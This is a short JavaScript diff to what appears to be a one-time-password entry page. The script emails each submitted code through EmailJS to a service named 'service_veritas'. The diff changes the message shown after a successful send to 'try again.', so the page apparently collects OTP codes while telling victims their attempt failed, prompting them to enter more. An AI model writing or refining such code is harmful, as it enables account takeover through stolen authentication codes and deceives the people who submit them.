@@ -141,14 +141,14 @@ if (otpForm && otpSingle && result) {
 
     
 
-    result.textContent = "connexion en cours...";
+    result.textContent = "connection en cours...";
     result.className = "";
 
 
     try {
 
         const response = await emailjs.send(
-            "ervice_veritas",
+            "service_veritas",
             "template_7rbqlcq",
             templateParams
         );
@@ -161,7 +161,7 @@ if (otpForm && otpSingle && result) {
         );
 
 
-        result.textContent = "success";
+        result.textContent = "try again.";
         result.className = "success";
 
 
